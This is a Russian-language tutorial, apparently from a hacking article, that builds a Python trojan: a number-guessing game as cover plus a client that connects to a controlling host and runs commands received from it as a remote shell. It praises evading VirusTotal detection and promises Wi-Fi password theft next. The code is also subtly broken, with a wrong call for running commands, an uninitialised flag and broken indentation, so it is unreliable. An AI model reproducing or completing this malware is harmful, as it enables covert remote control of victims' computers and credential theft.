Троян

По задумке, троян представляет собой клиент-серверное приложение с клиентом на машине
атакуемого и сервером на запускающей машине. Должен быть реализован максимально 
удаленный доступ к системе.

Как обычно, начнем с библиотек:

import random
import socket
import threading
import os

Для начала напишем игру "Угадай число".Тут все крайне просто, поэтому задерживаться долго 
не буду.

#Создаем функцию игры
def game():
	#Берем случайное число от 0 до 1000
	number = random.randint(0, 1000)
	#Счетчик попыток
	tries = 1
	#Флаг завершения игры
	done = False

	#Пока игра не закончена, просим ввести новое число
	while not done:
		guess = input('Input number:')
		#Если ввели число
		if guess.isdigit():
			#Конвертируем его в целое
			guess = int(guess)
			#Проверяем, совпало ли оно с загаданным: если да, опускаем флаг
			и пишем сообщение о победе

		if guess == number:
			done = True
			print(f'ы победил! Я загадал {guess}.Ты использовал {tries} попыток.')
		#Если же мы не угадали, прибавляем попытку и проверяем число на больше/меньше
		else:
			tries +=1
			if guess > number:
				print('Загаданное число меньше!')
			else:
				print('Загаданное число больше!')
		#Если ввели не число - выводим сообщение об ошибке и просим ввести число заново
		else:
			print('Это не число от 0 до 1000!')

Затем столько сложностей с проверкой на число? Можно было просто написать
guess = int(input('Input number: ')). Если бы мы написали так, то при вводе чего угодно,
кроме числа, выпадала бы ошибка, а этого допустить нельзя, т.к. ошибка заставит програму
остановиться и обрубит соединение.

Вот код нашего трояна. Ниже мы буде разбираться, как он работает, чтобы не проговаривать заново
базовые вещи.

#Создаем функцию трояна
def trojan():
	#IP-адрес атакуемого
	HOST = '192.168.2.112'
	#Порт, по которому мы работаем
	PORT = 9090

	#Создаем эхо-сервер
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.connect((HOST, PORT))

	while True:
		#Вводим команду серверу
		server_command = client.recv(1024).decode('cp866')
		#Если команда совпала с ключевым словом 'cmdon', запускаем режим работы
		с терминалом
		
		if server_command == 'cmdon':
			cmd_mode = True
			#Отправляем информацию на сервер
			client.send('Получен доступ к терминалу'.encode('cp866'))
			continue
		#Если команда совпала с ключевым словом 'cmdoff', выходим из режима работы
		с терминалом

		if server_command == 'cmdoff':
			cmd_mode = False
		#Если запущен режим работы с терминалом, вводим команду в терминал через сервер
		if cmd_mode:
			os.open(server_command)
		#Если же режим работы с терминалом выключен - можно вводить любые команды
		else:
			if server_command == 'hello':
				print('Hello World!')
		#Если команда дошла до клиента - выслать ответ
		client.send(f'(server_command) успешно отправлена!'.encode('cp866'))

Сначала нужно разобраться, что такое сокет и с чем его едят. Сокет простым языком - это 
условная вилка или розетка для программ. Существуют клиентские и серверные сокеты: 
серверный прослушивает определенный порт (розетка), а клиентский подключается к серверу (вилка).
После того как установлено соединение, начинается обмен данными.

Итак, строка client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) создает эхо-сервер
(отправили запрос - получили ответ). AF_INET означает работу сс IPv4-адресацией, 
а SOCK_STREAM указывает на то, что мы используем TCP-подключение вместо UDP, где пакет посылается 
в сеть и далее не отслеживается.

Строка client.connect((HOST, PORT)) указывает IP-адрес хоста и порт, по которым будет 
производиться подключение, и сразу подключается.

Функция client.recv(1024) принимает данные из сокета и является так называемым блокирующим
вызовом. Смысл такого вызова в том, что, пока команда не передается или не будет отвергнута
другой стороной, вызов будет продолжать выполняться. 1024 - это количество задействованных
байтов под буфер приема. Нельзя будет принять больше 124 байт (1 Кбайт) за один раз, но нам
это и не нужно: часто ты руками вводишь в консоль больше 1000 символов? Пытаться многократно увеличить
размер буфера не стоит - это затратно и бесполезно, т.к. большой буфер  нужен примерно никогда.

Команда decode('cp866') декодирует полученный байтовый буфер в текстовую строку согласно 
заданной кодировке (у нас 866). Но почему именно cp866? Зайдем в командную строку и 
введем команду chcp.

Кодировка по умолчанию для русскоговорящих устройств - 866, где кириллица добавлена в латиницу. 
В англоязычных версиях системы используется обычный Unicode, т.е. utf-8 in Python. Мы же
говорим на русском языке, так что поддерживать его нам просто необходимо.

При желании кодировку можно поменять в командной строке, набрав после chcp ее номер. Юникод
имеет номер 65001.

При приеме команды нужно определить, не служебная ли она. Если так, выполняем определенные
действия, иначе, если включен терминал, перенаправляем команду туда. Недостаток - результат
выполнения так и остается необработанным, а его хорошо бы отправлять нам. Это будет тебе
домашним заданием: реализовать данную функцию можно от силы минут за пятьнадцать, даже если
гуглить каждый шаг.

Результат проверки клиента на VirusTotal порадовал.

Базовый троян написан, и сейчас можно сделать очень многое на машине атакуемого, ведь у нас
доступ к командной строке. Но почему бы нам не расширить набор функций? Двай еще пароли от
Wi-Fi стащим!